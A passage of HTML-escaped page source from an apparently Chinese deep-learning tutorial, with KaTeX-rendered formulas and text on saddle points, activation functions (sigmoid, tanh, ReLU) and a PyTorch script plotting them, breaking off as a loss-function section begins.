mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace newline&#34;&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.73333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20744em;vertical-align:-0.8360000000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.0037em;&#34;&gt;Î±&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.37144em;&#34;&gt;&lt;span style=&#34;top:-2.3139999999999996em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8360000000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.73333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.79444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.0037em;&#34;&gt;Î±&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;æ¯”å±€éƒ¨æœ€å°å€¼æ›´å¯æ€•çš„é—®é¢˜æ˜¯éç‚¹çš„æƒ…å†µï¼Œæ¯”å¦‚ä¸€ä¸ªäºŒç»´çš„å‡½æ•°ï¼Œå¾ˆå¯èƒ½å‡ºç°ä¸€ç§æƒ…å†µï¼Œå°±æ˜¯æŸä¸ªç‚¹æ˜¯å…¶ä¸­ä¸€ä¸ªç»´åº¦çš„æå°å€¼ï¼Œä½†å´æ˜¯å¦ä¸€ä¸ªç»´åº¦çš„æå¤§å€¼ã€‚é‚£ä¹ˆå¯¹äºå¤šç»´çš„å‡½æ•°æ¥è¯´è¿™ç§æƒ…å†µæ˜¯å¾ˆå¸¸è§çš„ ã€‚&lt;/p&gt;
&lt;h4 id=&#34;31-å½±å“ä¼˜åŒ–å™¨çš„æ€§èƒ½çš„å› ç´ &#34;&gt;3.1 å½±å“ä¼˜åŒ–å™¨çš„æ€§èƒ½çš„å› ç´ &lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;åˆå§‹åŒ–çŠ¶æ€&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å­¦ä¹ ç‡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é€ƒç¦»å±€éƒ¨æœ€å°å€¼çš„æ–¹æ³•&lt;/p&gt;
&lt;p&gt;ç»™å‡ºä¸€ä¸ªæƒ¯æ€§ï¼Œä¹Ÿå°±æ˜¯å½“æ‰¾åˆ°æå°å€¼ç‚¹çš„æ—¶å€™æ ¹æ®æƒ¯æ€§ç»§ç»­å‘å‰ï¼Œæœ‰å¯èƒ½ä¼šé€ƒç¦»å‡ºæå°å€¼ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;4-æ¿€æ´»å‡½æ•°&#34;&gt;4. æ¿€æ´»å‡½æ•°&lt;/h3&gt;
&lt;p&gt;ä¸ºäº†å°†çº¿æ€§å‡½æ•°è½¬æ¢ä¸ºéçº¿æ€§å‡½æ•°å’Œæ–¹ä¾¿æ±‚å¯¼ï¼Œé€šå¸¸è¦åœ¨ç¥ç»å…ƒçš„æœ«å°¾åŠ ä¸Šæ¿€æ´»å‡½æ•°ã€‚&lt;/p&gt;
&lt;h4 id=&#34;41-sigmoid&#34;&gt;4.1 sigmoid&lt;/h4&gt;
&lt;p&gt;sigmoidä¼šå°†å€¼å‹ç¼©åˆ°(0,1)åŒºé—´ï¼ŒåŒæ—¶å¯¼æ•°éå¸¸å®¹æ˜“æ±‚è§£ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi&gt;Ïƒ&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34;&gt;â€²&lt;/mo&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;Ïƒ&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;Ïƒ&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\sigma&amp;#x27; = \sigma(1-\sigma)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.801892em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;Ïƒ&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.801892em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;â€²&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;Ïƒ&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;Ïƒ&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554534332.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.sigmoid()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;42-tanh&#34;&gt;4.2 tanh&lt;/h4&gt;
&lt;p&gt;tanhæ˜¯ç”±sigmoidå˜æ¢è€Œæ¥çš„ï¼Œå¯¼æ•°ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34;&gt;â€²&lt;/mo&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;tanh&amp;#x27; = 1-tanh^2
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.801892em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.801892em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;â€²&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.72777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8641079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8641079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554544273.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.tanh()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;43-relu&#34;&gt;4.3 ReLU&lt;/h4&gt;
&lt;p&gt;ReLUæ˜¯éå¸¸é€‚åˆç°åœ¨æ·±åº¦å­¦ä¹ çš„ï¼Œå¯¼æ•°è®¡ç®—èµ·æ¥éå¸¸ç®€å•ï¼Œå½“x&amp;lt;0æ—¶ï¼Œæ¢¯åº¦=0ï¼Œå½“x&amp;gt;0æ—¶ï¼Œæ¢¯åº¦=1ï¼Œä¸ä¼šå‡ºç°æ”¾å¤§å’Œç¼©å°çš„æƒ…å†µï¼Œå¾ˆéš¾å‡ºç°æ¢¯åº¦å¼¥æ•£å’Œæ¢¯åº¦ä¿éšœçš„æƒ…å†µ&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554553797.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.relu()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¼˜å…ˆä½¿ç”¨ReLUå‡½æ•°ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch
import torch.nn.functional as F
from torch.autograd import Variable

x = torch.linspace(-5, 5, 200)
x = Variable(x)

x_np = x.data.numpy()

y_relu = F.relu(x).data.numpy()
y_sigmoid = F.sigmoid(x).data.numpy()
y_tanh = F.tanh(x).data.numpy()
y_softplus = F.softplus(x).data.numpy()

import matplotlib.pyplot as plt  # python çš„å¯è§†åŒ–æ¨¡å—, æˆ‘æœ‰æ•™ç¨‹ (https://mofanpy.com/tutorials/data-manipulation/plt/)

plt.figure(1, figsize=(8, 6))
plt.subplot(221)
plt.plot(x_np, y_relu, c=&#39;red&#39;, label=&#39;relu&#39;)
plt.ylim((-1, 5))
plt.legend(loc=&#39;best&#39;)

plt.subplot(222)
plt.plot(x_np, y_sigmoid, c=&#39;red&#39;, label=&#39;sigmoid&#39;)
plt.ylim((-0.2, 1.2))
plt.legend(loc=&#39;best&#39;)

plt.subplot(223)
plt.plot(x_np, y_tanh, c=&#39;red&#39;, label=&#39;tanh&#39;)
plt.ylim((-1.2, 1.2))
plt.legend(loc=&#39;best&#39;)

plt.subplot(224)
plt.plot(x_np, y_softplus, c=&#39;red&#39;, label=&#39;softplus&#39;)
plt.ylim((-0.2, 6))
plt.legend(loc=&#39;best&#39;)

plt.show()
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554565183.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;5-æŸå¤±å‡½æ•°loss&#34;&gt;5. æŸå¤±å‡½æ•°Loss&lt;/h3&gt;
&lt;p&gt;æŸå¤±å‡½æ•°åˆ†ä¸ºä¸¤å¤§ç±»ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Mean Squared Errorå‡æ–¹å·®&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;M&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;âˆ‘&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mover accent=&#34;true&#34;&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;Ë‰&lt;/mo&gt;&lt;/mover&gt;&lt;msup&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;MSE = \sum(y-\bar y)^2
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;M&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; 